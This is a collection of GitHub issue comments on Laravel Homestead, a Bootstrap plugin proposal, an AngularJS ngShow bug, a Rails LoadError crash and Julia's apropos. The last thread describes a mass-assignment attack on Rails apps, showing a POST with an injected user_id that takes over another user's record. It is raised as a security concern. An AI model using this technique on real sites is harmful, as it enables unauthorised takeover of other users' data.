framework/laravel/6531/65821295,"Using words like ""most"" is ill-advised, as you have no way of knowing that. However, my main issue isn't that these changes to Homestead occurred at all, it's that they occurred in a way to make it unusable for those who do need more flexibility. Your proposed changes will help, but don't offer enough flexibility. Purestead does, but is a complete fork and therefore I'm not sure the benefit. I'll probably get around to extending Homestead using proper Vagrant inheritance... ",,False,False,6531
framework/laravel/6531/66770097,"@friend, I totally agree with you. The way homestead is going on is making it more difficult to share customized projects with a team. Will be much better if it follow the vagrant approach or as you say adds more flexibility of configurations per project. ",,False,False,6531
framework/laravel/6531/66997422,"Definitely agree with this. I've got many clients and many different projects; the beauty of Vagrant is being able to share those development configurations with the team, and to limit the impact of one environment on another. With Homestead 2 those key benefits no longer exist -/ Purestead looks like it might be a better option for now. First I've seen of that; will be trying it out. ",,False,False,6531
framework/laravel/6531/68175936,"plus one Homestead seems to drift away from the core Vagrant principal of discreet project server environments, for reasons I'm yet to understand. ",,False,False,6531
framework/laravel/6531/68546780,"plus one Agree with this. It's a nice idea, but it would be great to have the option to use Homestead as a standalone vagrant project as well. ",,False,False,6531
framework/laravel/6531/69490083,"I agree with this as well. It would be great to have a .homestead.yml file per project. It could work like Vagrant does.  would create a homestead.yml in your project root folder (similar to  ) instead of using a global file. For now, I am using only the homestead box directly with vagrant. ",,False,False,6531
framework/laravel/6531/74538256,Project specific Homestead environments are absolutely critical for our workflow. We will quite simply not be able to utilise Homestead as it stands at present. ,,False,False,6531
framework/laravel/6531/76507655,So question  if you want homestead to work like vagrant why don't you just use vagrant? ,,False,False,6531
framework/laravel/6531/76508530,The last commit on  was today so it is being worked on and it uses the same Box that Homestead does so it is the exact same software stack ,,False,False,6531
framework/laravel/6531/76722008,"i think, the discussion ""if you want homestead to work like vagrant, than use vagrant"" leads to nowhere. An example? Laravel (git)ignores the vendor dir per default but the default vm for laravel gives us no direct automatism to install the vendor dir?! Every team - my team, team of @friend, etc. - needs to implement provisioning additionally for getting even the minimum of loading the vendor dir. ",,False,False,6531
framework/laravel/6531/76723257,"@friend I find your ""I work this way, and so should you, or go elsewhere"" attitude to this issue unconstructive and opinionated. ""Use another product"" is not an appropriate response to this issue.  Because the product fits your needs does not make it appropriate for everyone, especially when the issue is with functionality which has been removed. ",,False,False,6531
framework/laravel/6531/76730566,"I've experimented lot's of frameworks since ruby on rails first came out, maybe 10 years ago from today, and what I like and amazed about laravel is there's a decent answer to virtually any common problem (which is the definition of a framework), without sacrificing flexibility and with great documentation. Homestead is a good utility for building up the dev. environment but it sacrifices some flexibility this time and I believe this is a very common case. Yes you can always set your own vagrant box or use an alternative but that's what we do with zend framework or symfony or any other popular framework, isn't it? ",,False,False,6531
framework/laravel/6531/76757012,I agree it's a missing feature. Vagrant supports multiple VMs per environment. Maybe this can somehow be used to allow for per-project VMs? ,,False,False,6531
framework/laravel/6531/76875325,"I'm not saying you cant use homestead I'm working in a group of 3, so homestead wouldn't work for us because if one person makes a change  like installs Mongo how do you handle that?? homestead as it is, does not handle stuff like this, so I made some changes to homestead and just copy them into the root of my project you can see my changes at  is more customisable and all configuration is now in the repo if you want mongodb on your vm just write a create-mongo.sh in the scripts and change homestead.rb to run it I have no idea who you would get homestead to do this ",,False,False,6531
framework/laravel/6531/76904261,"@friend You got the provisioning script in your project, which everyone uses? I don't understand, how you point invalidates provisioning per project for homestead? ",,False,False,6531
framework/laravel/6531/77062073,I think the best you could get homestead to do is copy the files into you project for you and maybe be a wrapper around vagrant to tell you when you may need to provision again I would not be opposed to homestead being able to do that but it should be to do this as well as have it's original functionality ♠homestead init --localHomestead.yamlVagrantfilelocal mode` where is just runs vagrant in the current directory but if it doesn't find one of those files it runs it in the global version that would be cool but now this is just how vagrant works but with some sugar ,,False,False,6531
framework/laravel/6531/77358725,"""just how vagrant works but with some sugar"" sounds perfectly fine to me. Homestead was (prior to version 2) essentially a Laravel-ready Vagrant configuration with some helpful wrappers around configuration and cli commands. There's nothing wrong with that; it was very useful. I've been happily using Purestead on recent projects anyway, so this isn't a massive issue for me (i.e. alternatives are available). I'm just not aware of a good argument for this change to a ""global Homestead"" in version 2. It's a lot of extra steps now to get my team on the same environment, and I don't see what's been gained. ",,False,False,6531
framework/laravel/6531/77393530,You can also still use Homestead 1. ,,False,False,6531
framework/laravel/6531/77474450,@friend I will have to find a source for this but the goal with Homestead was to have a way to quickly set up a new laravel site in vagrant and making a new box in vagrant is slow so put them all in the same box I think homestead is good for personal projects and tests eg trying out a new package or trying out a new concept I think @friend mentioned this in the lavavel podcast ep 19 but I could be wrong I will listen to it again and find out after work ,,False,False,6531
framework/laravel/6531/78451141,If you want to have a look at how i think local installs of homestead could work have a look at laravel/homestead#173 just an idea discuss ,,False,False,6531
framework/laravel/6531/78791235,"I have been using a customized version of homestead after version 2 because of this issue, today this issue came to my attemption and made me figure other people shares this same opinion, so i open sourced my customized version  is basically homestead, no customizations at all, only simplified and per project based. ",,False,False,6531
framework/laravel/6531/87071858,"I think this global homestead is a step backwards, it makes it really hard to commit the dev environment to source control and for other devs to simply vagrant up and get cracking. Plus the provisioning script is running for every homestead up? Each project has it's own provisioning requirements.... ",,False,False,6531
framework/laravel/6531/89870626,"Have to agree here, it seems a bit backwards. If we could add something similar to what @friend said above (check project folder first, then user folder) then that would be awesome. ",,False,False,6531
framework/laravel/6531/89948168,I tried to talk to Taylor about it and he said that he though Homestead was ok as it is so if we want a feature like this we will have to fork  but there is already projects around that do this eg purestead and firestead I also don't think another homestead fork is a good idea  ,,False,False,6531
framework/laravel/6531/90085969,Sucks to hear that disappointed ,,False,False,6531
framework/laravel/6531/90125897,"so, no original homestead in bigger teams with multiple homestead projects for me ... -1 ",,False,False,6531
framework/laravel/6531/90127626,"I feel bad about this too, but there is no way to please everyone... I don't know if the majority liked this new way, but seems to, as it's simpler... That's why forks exists, someone doesn't like the direction of the main project and fork and customize. We have two good alternatives, as @friend pointed, purestead and firestead, i haven't tested purestead but seems pretty good to me. ",,False,False,6531
framework/laravel/6531/90160640,"plus one I agree with many of the opinions stated in this thread. I love Homestead. I think it has been a great project but with Homestead 2, the added  directory has caused more problems than solutions for me. I don't really like having Homestead in 2 different directories either. I have started opting for other solutions but would prefer to stick with Homestead if possible. ",,False,False,6531
framework/laravel/6531/120120603,ping @friend this is already achieved so probably you can close this. ,,False,False,6531
framework/laravel/6531/120129192,Thanks @friend. ,,False,False,6531
bootstrap/twbs/16248/66845883,"Hello all. I'd first like to preface this with a little about myself. I am the primary maintainer for the Drupal Bootstrap base-theme. It currently has over 60k installs, so needless to say we get a lot of our own issues. Recently, I started the task of trying to tackle better anchor and scrolling support in the base-theme. Support for anchors or scrolling to them has always been a big pain, for not only me, but also a lot of others; especially when dealing with fixed navbars [jsbin]. The code I currently have in the project was rather hack-ish and completely un-configurable (my feeble attempt to satisfy a growing issue), so I set out to tackle this once and for all [ I've poured over countless blogs, docs, support forums and even found a few in this project's issue queue [#193, #1768, #11854]. The ""solutions"" vary from CSS to JS, but more often than not require at least some sort of manual configuration for it to work with that specific theme/offset requirement. Ultimately though, I've determined that a CSS-only solution just doesn't really cut it; especially when dealing with dynamic and varying content as such in CMS framework like Drupal. So, I've created the following JS based plugin instead  [demo/docs] In an effort to offset the ""cost"" for using JS, I was also inspired with the recent addition using anchor.js for Bootstrap's own documentation (#14897, #15491). This got me to thinking how this could easily be expanded from Bootstrap's own Tooltip plugin, like Popovers are. What makes it even more enticing is that there has been a  available to use for quite a while. Since both Tooltips and Popovers are completely opt-in with no data API support, it made sense to follow in that direction; especially for those who still want/need a CSS-only solution. My ultimate goal/desire is to merge this upstream into Bootstrap directly. I'm sure this will be a daunting task which is why I'm creating this issue now to get some feedback and eyes on this plugin so it can be flushed out a bit more. I'm still working on documentation of all the new options, so bare that in mind. I look forward to y'alls feedback! ",,False,False,16248
bootstrap/twbs/16248/90496139,"Hi @friend! You appear to have posted a live example ( which is always a good first step. However, according to the HTML5 validator, your example has some validation errors, which might potentially be causing your issue  line 99, column 23 A  meta ♠` element found after the first 512 bytes.  You'll need to fix these errors and post a revised example before we can proceed further. Thanks! (Please note that this is a fully automated comment.) ",,False,False,16248
bootstrap/twbs/16248/90788568,"I personally doubt the Core Team would be interested in getting into the same business as Anchor.js when Anchor.js itself already does a fine job. As for #1768 &amp; friends, you might have more traction on that front, although we're fairly reluctant to add more jQuery plugins at this point. I too wish there was a good solution to that bug though. ",,False,False,16248
bootstrap/twbs/16248/90794821,"Except that Anchor.js isn't bundled with Bootstrap. This is about providing and out-of-the-box native Bootstrap plugin... not relying on yet another 3rd party external library that people will have to download, install and configure in addition to. That's certainly debatable. It's lightweight and works well for simple sites, sure, but also at the cost of being easily configurable in case complexities arise. It doesn't use a template for inserting existing markup that a framework (like Bootstrap) already has available and the only way to replace the ""icon"" is to override/replace the CSS it provides. It's ID generation logic could also use some work. I'm really not trying to knock it, in fact it was in part responsible for the discovery process that led to this plugin. It certainly has it's use cases, but I wouldn't have built what I did if it did a ""good"" enough job. I would like to make it clear that this plugin is a pure extension on top of the existing Bootstrap tooltip plugin. It is and was not an Anchor.js rip-off, just inspired by it as well as Bootstrap's existing Tooltip plugin. I think you're missing the point of the plugin. It's goal is to really tie two concepts together anchors and links to anchors (anchor links). By doing so, they're aware of each other and can work together in harmony to provide a more cohesive anchor/scrolling solution. Sure. I'm not suggesting that this should be in the next release. It's currently not, by any means, ""production"" ready. In fact, I imagined that it would be BS4 in all reality (with the separate repo for BS3 support/prototyping). Like I said above, I opened this issue for exposure and to get viable feedback. I was hoping to have more of a positive feedback and to move forward rather than defending a solution to a problem that has been quite evident for quite some time now. I'm certainly open to suggestions, improvements and even changing some fundamental aspects about the plugin, it's not set in stone. I urge people to seriously consider this proposal rather than simply dismissing it outright because of ""simpler"" existing plugins. ",,False,False,16248
bootstrap/twbs/16248/90811676,"Just speaking generally There is a limit to what we can bundle, both due to the amount of effort required (e.g. I'm doubtful that Bootstrap itself will ever include a datepicker; they're just too damn complex and we already have our work cut out for us just maintaining the existing widgets) and due to fears of bloat (which we're already occasionally accused of with just our current set of widgets). And the trend these days is towards smaller modular packages rather than kitchen sinks. Actually, one of the hopes for Bootstrap v3 was to strengthen the third-party plugin ecosystem and thus lessen the pressure for new plugins in core Bootstrap, but unfortunately not much happened on that front. Anyway, I'll be interested to see what the rest of the team says about the proposal. ",,False,False,16248
bootstrap/twbs/16248/90818307,"I'm rather curious as to the hesitation. Have you even looked at the code and demo yet? I've already done most of the ground work...  agree, but this isn't about just adding a arbitrary feature, it's also a solution to an issue that this framework introduces in the first place by providing a fixed navbar. It's kind of like saying ""Here's a nifty feature for navigation, but don't mind that your anchors may behave a bit oddly at times. Will we fix it, no... there's a few hacks around the interwebs, do some research."" I will gladly accept sole responsibility for maintaining this specific plugin it if it were ever to come to that. Somehow though, I doubt that will happen considering it's already built upon and in the same format as the Tooltip plugin. Yes, I would be too. ",,False,False,16248
bootstrap/twbs/16248/90958237,"@friend A few things It's interesting to me that you get a lot of requests for the feature in your Drupal theme. Forgive me, but it's been quite some time since I touched PHP or any CMS but is that a common sort of feature in Drupal themes? I haven't seen it come up too often in Bootstrap's IRC channel or elsewhere, so it's interesting to me that it'd be a requested feature elsewhere. I'd also be interested if it's the sort of plugin other theme developers might want to use. Secondly, this is a bit unfair The docs note that using fixed navbars requires some padding adjustments. While that doesn't cover every combination of components and HTML on a page (a fixed navbar and anchors to IDs in this specific instance). Solving that problem is usually done simply with an offset on the click. Bootstrap-anchor does much more than solve that one issue, though, which brings me to my third thing. Adding features, especially full-fledged plugins, need to be evaluated in terms of long-term maintenance costs (it's great that you're offering to support it, but it's also no guarantee, unfortunately), added complexity (you'll be surprised by how authors use Bootstrap in unexpected ways) and package costs (like @friend pointed out, Bootstrap already gets flack for being heavy in many ways). Anyway, I'm not saying -1 yet but I'm not sold yet on why this should be a core plugin and not a community plugin. ",,False,False,16248
bootstrap/twbs/16248/91020406,"I wouldn't say it's ""common"" per se, but it certainly more of a prevalent issue when Drupal modules like the Administration Menu add their own fixed nav and increases the  margin (not padding) on top of a user who has opted to use the Bootstrap fixed navbar that adds  padding; it can get rather complicated and nasty very quickly. I think that's because people who are in the business of starting with Bootstrap directly (i.e. reading the docs, in the IRC channel) are generally themers/site builders or at the very least able to understand that there will be a minimal amount of effort in configuring their ""theme"". The Drupal Bootstrap base-theme's sole purpose is to bridge that gap between the dynamic aspect of Drupal and the Bootstrap framework. One of the main reasons this base-theme has risen to become very popular (currently third top Drupal theme) in such a short amount of time is because it allows non-themers to configure their Bootstrap theme in an easy to use administrative UI. I understand that I come from a unique perspective and it's partially a unique issue to us. Users choose Drupal Bootstrap because the framework is popular. The don't always choose it because they know the little intricacies/issues that come with choosing their fixed navbar type from the UI  These types of users are not always skilled CSS/JS ninjas, so when they see that there's an issue with their anchor's ""Solving that problem is usually done simply with an offset on the click"" is really not always as ""simple"" as it sounds. Which is why I've been working on a way to assist with/fix this problem. Yes, I understand and acknowledged this fact up front as one of the reasons for offsetting the ""cost"" of using a JS based solution to the scrolling issue by expanding upon Bootstrap's Tooltip plugin with anchor links. Also, again, it goes further than just ""adding in another feature"" really. The two work in together in harmony. By building the plugin with the concept of ""anchors"" and ""anchor links"", it allows for a more cohesive UX in addressing ""What happens when I click an anchor on this page?"". I do find it a little ironic though that even the docs suddenly had a need for them, but there wasn't anything native in Bootstrap to do it so a third party plugin was used instead. I really do understand all of this and agree with it, believe me, I do. I'm not suggesting this plugin is just thrown in willy nilly without any sort of evaluation, game plan or what have you. I think the real purpose of why I opened this issue in the first place is really being lost here. I'm not saying it can't be either. I opened this issue to get evaluation and feedback on the plugin itself, not quarrel over semantics. Yes, I said it was my goal/desire to ultimately make this a core plugin, but who knows, maybe that won't be the case and I'll just keep it as a separate contrib plugin. That is certainly fine by me. All I was looking for really was ""Wow that's cool... let's work on making it better! Maybe it's something that does have merit to pull into core.""... you know FOSS, not getting smacked down for having an idea on how to fix a very real issue. I'm honestly half tempted to just close this issue and just continue developing it as a contrib plugin if this is going to be the attitude moving forward frowning ",,False,False,16248
bootstrap/twbs/16248/92155500,"Your plugin looks and feels awesome in my super quick tests, so props on that front. I'll try to address as much of your post and the replies here as I can. Development approach Tooltips and popovers are opt-in do to performance issues with detecting , , etc on every DOM element. Good call here, that does indeed make sense. Your goal and feedback Right on, a bold endeavor to say the least ). I think @friend, as a core team member, covered the generalities quite well, though I think you've mistaken some of his comments as overly dismissive. He's outlined that  We're reluctant to add new JavaScript. Expanding on that, we're not adding any new features to v3. It's a call we made to avoid having to rewrite even more for v4. We've got Anchor.js in there right now and it's solving the problem it was meant to solve—linking to specific sections of content—quite well. There's a balance to what we can do with the size of the team we have. We build things we think folks would like to use, as well as things we ourselves want to build and maintain.  You didn't get any real feedback on your own plugin, but that's not really something we're here to provide unfortunately. At least, not in a structured or timely way that would be of much use to yourself. Looking at the demo and docs though, it seems to work quite well and is a decently structured and focused plugin. All around, it seems great. Fixed navbars Yes, we've got fixed navbars and yes there's the problem of overlapping content. I'd prefer we didn't add more JavaScript to address that, but I understand folks also don't want to have to address these kind of things themselves. I'm torn on how far to go there, and because of that, we likely won't try to address it ourselves. I'd like us to continue to err on the side of caution for this kind of stuff. Maintenance You've offered to maintain it, but that's not enough. Putting it in the main repo means committing to it and supporting it as a team. Bug reports, further feature development, and documentation all come into play there. I'm not saying you wouldn't be up to it, but we might not be. That's not meant to be dick-ish, it's just matter-of-fact. On feedback No one has smacked you down. One team contributor and one community member voiced their opinions. Their questions and comments are just as valid as your own. While you've very clearly asked for feedback, you also very clearly stated you'd like this to be part of the core project. Two folks have focused on the latter while reviewing this thread.  Lastly, shifting gears back to the plugin itself, it's a damned fine plugin. I'd like to see it continue as a community project as I don't think it's something we'd like to see addressed with Bootstrap. Yes, the fixed navbar introduces a potential need for this. However, that's not unique to our navbars—damned near every component likely introduces a potential need for n number of edge cases, extensions, etc. Please do continue to develop and share it with folks, but it won't be part of Bootstrap's core (not in v3 or v4, not at this point at least). Please also continue to use this thread to gather feedback from folks if you wish. I'd love if more of our team chimed in, but we're all on different schedules and what not. Hope that helps some. &lt;3 ",,False,False,16248
angular.js/angular/4401/20935765,"ngShowDirective watches attr.ngShow, and adds ng-hide-remove class even when the attr.ngShow value ""changes"" from true to true (or from false to false). Animations should only be applied if the actual value of ng-hide has changed if ( toBoolean(value) !== toBoolean(oldValue) ) {   $animatetoBoolean(value) ? 'removeClass'  'addClass'; } ",,False,False,4401
angular.js/angular/4401/26236153,I can't reproduce the problem here  - Can you modify the Plunker to demonstrate the issue? ,,False,False,4401
angular.js/angular/4401/26301736,"Thanks, @friend.  Great idea! This reveals the issue, when you type in the new text field I added.  ",,False,False,4401
angular.js/angular/4401/26301862,P.S. I'd be happy and honoured to submit a pull request for this issue if you like -) ,,False,False,4401
angular.js/angular/4401/26303594,"Hmm... actually, my naïve solution doesn't work - the ng-show directive wouldn't initially add the ng-hide class (since value and oldvalue are both ""undefined"" at the start, so the boolean value doesn't look like it's ""changed"".  Needs more thought... ",,False,False,4401
angular.js/angular/4401/26390790,@friend how's this coming? I can make a quick PR towards the end of the week unless you're still on this. ,,False,False,4401
angular.js/angular/4401/26393110,"I'm a bit stuck, to tell you the truth. My fix (above) only works for ngHideDirective, and that's only because of an accident - namely that if the initial toBoolean(oldValue) is false, this matches the fact that we haven't yet added or removed either of the ng-hide-add and ng-hide-remove classes; hence doing nothing is appropriate. The ngShowDirective is more complicated.  If value and oldValue are both initially ""undefined"" or falsy, we must take action to add ng-hide, even though it doesn't seem like the model has changed.  Otherwise '''&lt;span ng-show=""undefinedValue""&gt;''' will fail to be hidden at start up. Is there a way to tell if this is the first time the $watch() function has been called?  Then we could do this ''' var ngShowDirective = ['$animate', function($animate) {   return function(scope, element, attr) {     scope.$watch(attr.ngShow, function ngShowWatchAction(value, oldValue){       if ( isFirstTimeThisWatchHasFired || (toBoolean(value) !== toBoolean(oldValue)) ) {         $animatetoBoolean(value) ? 'removeClass'  'addClass';       }     });   }; }]; ''' Any ideas? ",,False,False,4401
angular.js/angular/4401/26473531,You could try to define a variable outside of the watch and check if it is true. Also take a look at $compile to see if you setup the addClass/removeClass guard there ,,False,False,4401
angular.js/angular/4401/26474600,"Thanks @friend! I'm embarrassed that the solution is so obvious -)  I added the local variable, and it now works as I'd expect.  I'll send a pull request ASAP.  Not sure how to add tests for this feature though.  Any advice? ",,False,False,4401
angular.js/angular/4401/26477089,"A good place to start is with  Just add another speak and try to use the mocking system that the two existing tests are using. To run tests, do the following  npm install ./node_modules/.bin/bower install grunt autotest  Then when everything is passing and your code is ready to go, try the following  grunt test  After that change your commit message style to follow AngularJS' style Take a look at some of the commits here ",,False,False,4401
angular.js/angular/4401/26822122,@friend how's this coming along? Do you need me to help out in any way? ,,False,False,4401
angular.js/angular/4401/26852813,"Hi @friend. I've sent pull request #4479, and I think I've formatted it correctly now (my first ever pull request - very exciting stuff!) I just had a brief holiday in Sydney, so haven't had a chance to write the tests.  Also, I've never written unit tests in the framework used in Angular.  I'd be keen to try, and from the looks of things, this is a fairly simple example to get started on. I've been reading up on how to test code like this, and it's a great way to get deeper into how Angular works, so if there's no rush to get this fixed, I'd be happy to tackle the tests.  I've got a huge stack of work to catch up on, though, so it won't happen this week.  If you have the time and the inclination to write the tests, I'd be happy to learn from your example - I'll use the lesson to fix something else in the Angular code base -) ",,False,False,4401
angular.js/angular/4401/26898160,@friend no problem. I can handle the tests. I'm trying to close just about all the animation PRs before 1.2 is released. ,,False,False,4401
angular.js/angular/4401/26944525,"@friend great work for fixing this with ngShow/ngHide. Turns out that after looking more into the problem, $animate is causing the issue and the CSS class checking has to occur inside of it. So the solution has to fix it for all cases. The ngShow/ngHide PR you made only works for that one ($animate.addClass / removeClass was had this issue to begin with). Here's the new PR  a working version of your demo with the new PR  for closing your PR on this. Thank you for putting the work into it. ",,False,False,4401
angular.js/angular/4401/26949336,"Thanks Matias -) Interesting.  My first thought was to check hasClass(), but that felt DOM-centric and implementation-specific.  I was afraid I was falling into my old jQuery habits (storing ""model"" in DOM) -)  That's not a criticism; I think the area that you've amended is at the same level of abstraction as the fix you've added.  It felt awkward to add class-level checks inside the ngShowHide.js file though. I like how simple the general solution is now. Thanks so much for your help and encouragement with this - I've really enjoyed the experience.  It's my first contribution to OSS, and thanks to you and your kind and helpful attitude, I'm definitely going to do more! Grant On 24/10/2013, at 954 AM, Matias Niemelä notifications@friend.com wrote ",,False,False,4401
angular.js/angular/4401/27033469,@friend happy to hear that the fix is good. And thanks for the feedback about the OSS stuff. I'm happy to help. Keep contributing! You learn a lot when working on an open-source project. ,,False,False,4401
angular.js/angular/4401/27033692,Landed as ,,False,False,4401
rails/rails/29632/239576557,"It's possible for  to be  when a mixin included in  is misnamed, resulting in a crash on boot with a none-too-useful error Full stack trace here  to reproduce I have several chunks of application-wide helper functionality split out into mixins like They are included in  Everything works fine when the names are correct, but when they aren't - say  includes  by accident - I get a crash on boot with the above stack trace. It's worth noting that i'm using inflections to define a  acronym, though when messing around it doesn't seem to make a difference. There are actually two  calls on the line in question  I hacked a  in there and confirmed that it's  that is . Expected behavior The error message should reflect the problem - missing module, bad file name, etc. Actual behavior The  method itself errors, raising a  that does little to indicate the underlying problem. System configuration Rails version 5.1.1 Ruby version 2.3.4 ",,False,False,29632
rails/rails/29632/312434005,"I tried to look at this bug, but I was not able to reproduce. Could you post a code that would reproduce the bug? ",,False,False,29632
rails/rails/29632/312663180,"@friend, I also tried to reproduce but I was not able like @friend , meaning that I see a different error output. I created a new app adding just the css_helper.rb file and including it in application_helper.rb and when i boot in production env i get the following error message that seems quite useful from /Apps/issue-29632/app/helpers/application_helper.rb1in &lt;top (required)&gt;' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/activesupport-5.1.1/lib/active_support/dependencies/interlock.rb12in block in loading' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/activesupport-5.1.1/lib/active_support/concurrency/share_lock.rb149in exclusive' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/activesupport-5.1.1/lib/active_support/dependencies/interlock.rb11in loading' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb150in block in modules_for_helpers' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb145in map!' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb145in modules_for_helpers' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/action_controller/metal/helpers.rb93in modules_for_helpers' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb109in helper' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb187in default_helper_module!' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb36in block in inherited' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb36in class_eval' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionpack-5.1.1/lib/abstract_controller/helpers.rb36in inherited' from /Users/domangi/.rvm/gems/ruby-2.3.3/gems/actionview-5.1.1/lib/action_view/layouts.rb217in inherited'  Btw, if I include HelperMixinsCSSHelper in application_helper.rb i get another error because it is searching for CssHelper instead `rescue in block in modules_for_helpers' Couldn't find HelperMixinsCssHelper, expected it to be defined in helpers/helper_mixins/css_helper.rb (NameError) I will investigate more on this to understand if it is actually a bug or not. ",,False,False,29632
rails/rails/29632/313040397,"Yes, the underlying issue is that the helper is misnamed. Easy to fix. The problem this issue is addressing is that - one way or another - it is possible for to enter the  function for a  that has  of , causing the sub' for nilNilClass (NoMethodError)LoadError#is_missing?LoadError#pathnilLoadError#path#subString` or whatever) before telling it to. ",,False,False,29632
rails/rails/29632/313084335,"Yes, please do PR. While modern rubies won't internally raise a LoadError without a , it wasn't that long ago that it was normal, so it seems reasonable for us to accomodate 3rd party libraries that haven't caught up with the times. (Though correspondingly, we shouldn't be generating such half-formed exceptions.) I don't think it should raise, though just return false. This method is already here for us to attempt to friendlify an error message; if the  is missing, the safest choice would seem to be to assume it's not the error we're looking for, and let it proceed as is. It'd also probably be worthwhile identifying which library is seemingly interfering, to help them modernize.. but as you say, handling it on our side is independent of that. ",,False,False,29632
rails/rails/29632/317820557,"Even just sticking a  in there seems fine. Either way this should be a very small change, just needs a test. @friend Were you interested in opening a PR for this? ",,False,False,29632
rails/rails/29632/318024069,"Sorry, hadn't had the time because i was thinking I'd have to set up a whole local dev env to do the change and test it, but it's so small and I figured you guys probably have some sort of CI anyways so I just did it in the web UI. ",,False,False,29632
rails/rails/29632/320246411,"@friend we do have a CI but there isn't a test testing the case you changed, i.e. the case where a load path is nil. We can't accept a change without a test because then someone can come along and say the same thing ""just a small change, the suite passes, remove the "" and then your case will be broken again. The test is prevent regressions, not because we think this change is too dangerous. ",,False,False,29632
rails/rails/29632/320352486,"@friend nah I totally get it, I just don't have a dev env set up for Rails and I figured that was gonna take a decent amount of time... I've been in serious crunch mode trying to ship something. But I just looked at the dev setup instructions and it looks really simple so I'll give it an hour right now and see where get. ",,False,False,29632
rails/rails/29632/320356754,@friend is there a Docker image for the dev env? I'm wary to install Virtual Box because I know it's had conflicts with Docker in the past and I really can't break my work env right now. ,,False,False,29632
rails/rails/29632/320361267,"If you're on a mac I recommend doing it ""the hard way"" which really isn't that time consuming. You can probably skip setting up active record so as long as you have a supported Ruby installation shouldn't be much more involved than starting a rails app. We don't have a docker image that I'm aware of. I totally understand if you don't have time to work on the issue. Open source is time consuming! I wanted to explain why we can't merge the PR as is 😀 If you run into an issue setting up locally let me know ",,False,False,29632
rails/rails/29632/341607799,"This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the  branch or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions. ",,False,False,29632
julia/JuliaLang/12989/105118611,"Currently, apropos' output is quite simple — it's just the objects whose docstrings match the search text It might be nice to make this display a bit richer. We could additionally print out the first non-code documentation line to the edge of the screen, e.g., It also might be nice to make it return a Julia type that simply contains an array of objects and their documentation, so IJulia and other non-REPL programs can format it a little nicer or linkify the text for full documentation.  This does have the downside of making the display non-incremental, making it feel a little slower, but it may be worth it. The implementation is also quite simple and should be fairly simple to extend. ",,False,False,12989
julia/JuliaLang/12989/138351688,"I'd like to take this up. Some questions/remarks Currently, in 0.3, apropos(""pearson"") prints this while in 0.4, apropos seems to have been removed entirely. What are the most important functions and files I will need to read / modify, and which branch should I work in? ",,False,False,12989
julia/JuliaLang/12989/138358530,@friend you'll have to update.  was very recently reintroduced. ,,False,False,12989
julia/JuliaLang/12989/138359214,"@friend Oh, I was on a 7 days old master. Updating now - thanks! ",,False,False,12989
julia/JuliaLang/12989/151637987,"I agree that enriching the  by providing a good indication as to what the found objects are/do is desirable.  However, after studying and playing with Docs.jl and company, I'm concerned that addressing this issue might be easier said than done, possibly leading to confusing or misleading results The Good  and the new Documentation facilities strike me as extremely well designed, providing a solid foundation for development.   nicely sifts through (loaded) module's  information for matches to its target.  It has available both the keys (objects) and values (object documentation) of these matches but, currently ""merely"" prints the keys.  So the information needed to implement this improvement is right where it needs to be, which seems pretty good. The Complicated  There is almost an embarrassment of riches in the object documentation available to  (but currently unused).  It is difficult to know how to consistently extract an appropriate summary from the available information. Looking at the object documentation for  and  in , @friend 's suggestion is quite reasonable.  Just dig through the object documentation,  select the right Markdown structure and (if needed) truncate it for brevity. However the situation may be different in the future.  Looking at a recent version of Master So it looks as if the documentation for objects (generic functions in particular) may be getting rewritten to better fit with the new documentation system, with an emphasis on providing information on how to use representative methods of generic functions rather than on providing generic documentation of the function.  A naive implementation of the improvement to apropos might look good in the current release but show, rather unhelpfully, in a recent Master I suppose that one approach would be to look through the object documentation to print the text in the vicinity of (one of) the matches to the  search target. Any suggestions on how to proceed?  Do we need to rethink this improvement in the light of how Julia object documentation appears to be developing?  Does it make sense to leave  be (it is simple, robust and effective) and consider developing a different tool for more in-depth exploration and presentation of Julia objects?  A feature rich apropos-like tool that (optionally) works across all installed/registered modules could be quite cool, but that might be best developed as a module. ",,False,False,12989
julia/JuliaLang/12989/152782477,"Since my last comment, I've learned a bit more about the structure of object documentation and now feel that enhancing  will be easier than I had thought.  This change of attitude comes with the realization that generic function documentation is ordered in a reasonable way, making it easy to identify the most generic definition of a function.  (Confusingly to me, the doc macro presents function definitions from more specific to less, which is what made my examination of the  documentation disheartening.) So I know how to easily retrieve the most generic definition of a function.  What's the hold-up to solving this issue and having a cooler  command?  It's truncating this definition, which is typically Markdown, for presentation.  I don't yet know how to do that.  Does anyone have any suggestions? ",,False,False,12989
rails/rails/5228/3452651,"Those who don't know methods attr_accesible / protected - check that article out  view at typical situation - middle level rails developer builds website for customer, w/o any special protections in model(Yeah! they don't write it! I have asked few my friends - they dont!) Next, people use this website but if any of them has an idea that developer didnt specify ""attr_accesible"" - hacker can just add an http field in params, e.g. we have pursue's name edition. POST request at pursues#update id = 333 (target's pursues id) pursue['name'] = 'my purses name' pursue['user_id'] = 412(hacker id) if code is scaffolded than likely we got Pursue.find(params[id]).update_attributes(params[pursue]) in the controller. And that is what I worry about. After execution that POST we got hacker owning target's pursue! I don't mean that it is Rails problem, of course not. But let's get it real(Getting Real ok) - most of developers are middle/junior level and most of them don't write important but not very neccessary things tests, role checks etc including topic - attr_accesible how to avoid injections ? What should Rails framework do to force people to keep their rails websites safe? Making attr_accesible necessary field in model? What do you think guys. ",,False,False,5228
